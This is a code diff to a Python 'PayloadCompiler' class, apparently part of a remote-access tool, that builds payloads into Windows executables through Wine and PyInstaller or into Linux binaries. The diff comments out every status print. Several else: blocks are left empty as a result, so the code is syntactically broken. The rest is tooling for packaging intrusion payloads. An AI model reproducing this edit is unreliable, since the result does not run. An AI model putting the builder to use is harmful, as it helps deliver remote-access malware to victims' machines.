@@ -36,7 +36,7 @@ class PayloadCompiler:
     def install_pyinstaller(self):
         """Attempt to install PyInstaller"""
         try:
-            st_print("[*] Installing PyInstaller...")
+    # st_print("[*] Installing PyInstaller...")
             subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pyinstaller'])
             self.pyinstaller_available = True
             return True
@@ -47,9 +47,9 @@ class PayloadCompiler:
     def setup_wine_python(self):
         """Setup Python in Wine environment for Windows cross-compilation"""
         if not self.wine_available:
-            st_print("[!] Wine not installed. Cannot create Windows executables on Linux.")
-            st_print("[*] To install Wine on Ubuntu/Debian: sudo apt-get install wine wine32 wine64")
-            st_print("[*] To install Wine on RHEL/CentOS: sudo yum install wine")
+    # st_print("[!] Wine not installed. Cannot create Windows executables on Linux.")
+    # st_print("[*] To install Wine on Ubuntu/Debian: sudo apt-get install wine wine32 wine64")
+    # st_print("[*] To install Wine on RHEL/CentOS: sudo yum install wine")
             return False
         
         # Check common Wine Python locations
@@ -63,27 +63,27 @@ class PayloadCompiler:
         for python_path in wine_pythons:
             if os.path.exists(python_path):
                 self.wine_python_path = python_path
-                st_print(f"[+] Found Wine Python at: {python_path}")
+    # st_print(f"[+] Found Wine Python at: {python_path}")
                 return True
         
         # Try to install Python in Wine
         try:
-            st_print("[*] Setting up Python in Wine environment...")
+    # st_print("[*] Setting up Python in Wine environment...")
             
             # Download Python installer
             python_url = 'https://www.python.org/ftp/python/3.9.13/python-3.9.13-amd64.exe'
             installer_path = '/tmp/python-installer.exe'
             
             if not os.path.exists(installer_path):
-                st_print("[*] Downloading Windows Python installer...")
+    # st_print("[*] Downloading Windows Python installer...")
                 subprocess.run(['wget', '-q', '-O', installer_path, python_url], check=True)
             
-            st_print("[*] Installing Python in Wine (this may take a few minutes)...")
+    # st_print("[*] Installing Python in Wine (this may take a few minutes)...")
             subprocess.run(['wine', installer_path, '/quiet', 'InstallAllUsers=1', 'PrependPath=1'], 
                          check=True, capture_output=True)
             
             # Install PyInstaller in Wine Python
-            st_print("[*] Installing PyInstaller in Wine Python...")
+    # st_print("[*] Installing PyInstaller in Wine Python...")
             wine_python = os.path.expanduser('~/.wine/drive_c/Python39/python.exe')
             subprocess.run(['wine', wine_python, '-m', 'pip', 'install', '--quiet', 'pyinstaller'], 
                          check=True, capture_output=True)
@@ -93,7 +93,7 @@ class PayloadCompiler:
                 os.remove(installer_path)
             
             self.wine_python_path = wine_python
-            st_print("[+] Wine Python environment setup complete")
+    # st_print("[+] Wine Python environment setup complete")
             return True
             
         except subprocess.CalledProcessError as e:
@@ -107,13 +107,13 @@ class PayloadCompiler:
         """Cross-compile Windows executable using Wine and PyInstaller"""
         
         if not self.wine_available:
-            st_print("[!] Wine not available. Falling back to Python script.")
+    # st_print("[!] Wine not available. Falling back to Python script.")
             return
         if not self.wine_python_path and not self.setup_wine_python():
-            st_print("[!] Failed to setup Wine Python environment.")
+    # st_print("[!] Failed to setup Wine Python environment.")
             return
         try:
-            st_print("[*] Cross-compiling Windows executable...")
+    # st_print("[*] Cross-compiling Windows executable...")
             
             # Change to source directory
             original_dir = os.getcwd()
@@ -179,13 +179,13 @@ exe = EXE(pyz,
                 spec_path
             ]
             
-            st_print(f"[*] Running: {' '.join(cmd)}")
+    # st_print(f"[*] Running: {' '.join(cmd)}")
             result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
             
             if result.returncode == 0:
                 exe_path = os.path.join(output_dir, f'{payload_name}.exe')
                 if os.path.exists(exe_path):
-                    st_print(f"[+] Windows executable created: {exe_path}")
+    # st_print(f"[+] Windows executable created: {exe_path}")
                     
                     # Move to Binaries subdirectory
                     binary_dir = os.path.join(output_dir, 'Binaries')
@@ -196,14 +196,14 @@ exe = EXE(pyz,
                     os.chdir(original_dir)
                     return final_path
                 else:
-                    st_print("[!] Executable not found after compilation")
+    # st_print("[!] Executable not found after compilation")
             else:
-                st_print(f"[!] Wine PyInstaller failed:\n{result.stderr}")
+    # st_print(f"[!] Wine PyInstaller failed:\n{result.stderr}")
             
             os.chdir(original_dir)
             return
         except subprocess.TimeoutExpired:
-            st_print("[!] Compilation timed out after 120 seconds")
+    # st_print("[!] Compilation timed out after 120 seconds")
             os.chdir(original_dir)
             return
         except Exception as e:
@@ -214,12 +214,12 @@ exe = EXE(pyz,
         """Compile Linux executable using native PyInstaller"""
         
         if not self.pyinstaller_available:
-            st_print("[!] PyInstaller not available. Attempting to install...")
+    # st_print("[!] PyInstaller not available. Attempting to install...")
             if not self.install_pyinstaller():
-                st_print("[!] Failed to install PyInstaller. Returning Python script.")
+    # st_print("[!] Failed to install PyInstaller. Returning Python script.")
                 return
         try:
-            st_print("[*] Compiling Linux executable with PyInstaller...")
+    # st_print("[*] Compiling Linux executable with PyInstaller...")
             
             # Change to source directory
             original_dir = os.getcwd()
@@ -281,13 +281,13 @@ exe = EXE(pyz,
                 spec_path
             ]
             
-            st_print(f"[*] Running: {' '.join(cmd)}")
+    # st_print(f"[*] Running: {' '.join(cmd)}")
             result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
             
             if result.returncode == 0:
                 binary_path = os.path.join(output_dir, payload_name)
                 if os.path.exists(binary_path):
-                    st_print(f"[+] Linux executable created: {binary_path}")
+    # st_print(f"[+] Linux executable created: {binary_path}")
                     
                     # Make executable
                     os.chmod(binary_path, 0o755)
@@ -301,14 +301,14 @@ exe = EXE(pyz,
                     os.chdir(original_dir)
                     return final_path
                 else:
-                    st_print("[!] Binary not found after compilation")
+    # st_print("[!] Binary not found after compilation")
             else:
-                st_print(f"[!] PyInstaller failed:\n{result.stderr}")
+    # st_print(f"[!] PyInstaller failed:\n{result.stderr}")
             
             os.chdir(original_dir)
             return
         except subprocess.TimeoutExpired:
-            st_print("[!] Compilation timed out after 120 seconds")
+    # st_print("[!] Compilation timed out after 120 seconds")
             os.chdir(original_dir)
             return
         except Exception as e:
@@ -342,7 +342,7 @@ exe = EXE(pyz,
             else:
                 platform = 'linux'  # Default fallback
         
-        st_print(f"[*] Compiling payload for {platform} platform...")
+    # st_print(f"[*] Compiling payload for {platform} platform...")
         
         # Ensure output directory exists
         os.makedirs(output_dir, exist_ok=True)
@@ -352,14 +352,14 @@ exe = EXE(pyz,
             # Try cross-compilation first, fall back to script
             result = self.compile_for_windows(source_dir, output_dir, payload_name)
             if not result:
-                st_print("[*] Falling back to Python script for Windows target")
+    # st_print("[*] Falling back to Python script for Windows target")
                 return self.create_python_payload(source_dir, output_dir, payload_name)
         
         elif platform == 'linux':
             # Compile native Linux binary
             result = self.compile_for_linux(source_dir, output_dir, payload_name)
             if not result:
-                st_print("[*] Falling back to Python script for Linux target")
+    # st_print("[*] Falling back to Python script for Linux target")
                 return self.create_python_payload(source_dir, output_dir, payload_name)
         
         elif platform == 'python':
@@ -367,7 +367,7 @@ exe = EXE(pyz,
             return self.create_python_payload(source_dir, output_dir, payload_name)
         
         else:
-            st_print(f"[!] Unsupported platform: {platform}")
+    # st_print(f"[!] Unsupported platform: {platform}")
             return self.create_python_payload(source_dir, output_dir, payload_name)
         
         return result
@@ -375,7 +375,7 @@ exe = EXE(pyz,
     def create_python_payload(self, source_dir, output_dir, payload_name='stitch_payload'):
         """Create a standalone Python script payload"""
         try:
-            st_print("[*] Creating Python script payload...")
+    # st_print("[*] Creating Python script payload...")
             
             # Create Binaries directory
             binary_dir = os.path.join(output_dir, 'Binaries')
@@ -387,10 +387,10 @@ exe = EXE(pyz,
             
             if os.path.exists(source_file):
                 shutil.copy2(source_file, output_file)
-                st_print(f"[+] Python payload created: {output_file}")
+    # st_print(f"[+] Python payload created: {output_file}")
                 return output_file
             else:
-                st_print(f"[!] Source file not found: {source_file}")
+    # st_print(f"[!] Source file not found: {source_file}")
                 return
         except Exception as e:
             st_log.error(f"Failed to create Python payload: {e}")
